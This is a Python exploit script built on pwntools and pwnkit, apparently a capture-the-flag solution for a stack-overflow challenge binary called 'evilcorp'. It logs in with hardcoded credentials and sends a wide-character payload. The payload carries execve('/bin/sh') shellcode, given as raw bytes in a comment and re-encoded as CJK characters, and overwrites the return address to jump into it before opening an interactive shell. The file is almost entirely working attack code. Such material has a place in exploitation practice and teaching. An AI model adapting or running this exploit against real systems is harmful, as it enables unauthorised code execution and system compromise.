#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Title : Linux Pwn Exploit
# Author: Axura (@4xura) - https://4xura.com
#
# Description:
# ------------
# A Python exp for Linux binex interaction
#
# Usage:
# ------
# - Local mode  : ./xpl.py
# - Remote mode : ./xpl.py [ <IP> <PORT> | <IP:PORT> ]
#

from pwnkit import *
from pwn import *
import os, sys

# CONFIG
# ---------------------------------------------------------------------------
BIN_PATH   = '/home/Axura/pwn/pwnkit/examples/stack-overflow/evil-corp/evilcorp'
LIBC_PATH  = None
elf        = ELF(BIN_PATH, checksec=False)
libc       = ELF(LIBC_PATH) if LIBC_PATH else None
host, port = parse_argv(sys.argv[1:], None, None)

ctx = Context(
    arch      = 'amd64',
    os        = 'linux',
    endian    = 'little',
    log_level = 'debug',
    terminal  = ('tmux', 'splitw', '-h')
).push()

io = Tube(
    file_path = BIN_PATH,
    libc_path = LIBC_PATH,
    host      = host,
    port      = port,
    env       = {}
).init().alias()
set_global_io(io)	# s, sa, sl, sla, r, ru, uu64

init_pr("debug", "%(asctime)s - %(levelname)s - %(message)s", "%H:%M:%S")

# EXPLOIT
# ---------------------------------------------------------------------------
def xpl(**kwargs):
    """
    Breakpoints

    .text:0000000000001795                 call    _fgetws
    .text:000000000000179A                 mov     edx, 1000h
    """
    # g("breakrva 0x1795")

    """
    Login
    """
    sla(b'Username:', b'eliot')
    sla(b'Password:', b'4007')

    """
    Send options
    """
    tail = '信息'.encode() 
    sla(b">>", b"2")
    
    """
    Create wchar for address 0x11000
    """
    null = b"\0"
    ret_addr = "𑀀".encode() + null

    """
    Calculate padding to return address:

    add rsp, 0x3e80
    pop rbx
    ret
    """
    pad = 0x3e80 + 0x8

    """
    Debug
    """
    # pl  = b"a" * int(pad/4)
    # pl += ret_addr

    """
    Stack Overflow
    """
    dt = 0x11000 - 0x10000
    
    pl  = b"a" * int(dt/2)
    # pl += b"b" * 0x100
   
    """
    Construct payload for re2shellcode

    shellcode  = "\x48\x31\xc0\x50\x48\xbb\x2f\x2f"
    shellcode += "\x62\x69\x6e\x2f\x73\x68\x53\x48"
    shellcode += "\x89\xe7\x50\x48\x89\xe2\x57\x48"
    shellcode += "\x89\xe6\x48\x83\xc0\x3b\x0f\x05"
    """
    shellcode_wchar = 'ㅈ僀뭈⼯楢⽮桳䡓䡐䡗荈㯀ԏ'

    pl += shellcode_wchar.encode()
    pl += null * int((pad/4) - dt/2 - len(shellcode_wchar))
    pl += ret_addr

    """
    Input
    """
    sla(tail, pl)

    io.interactive()

# PIPELINE
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    xpl()

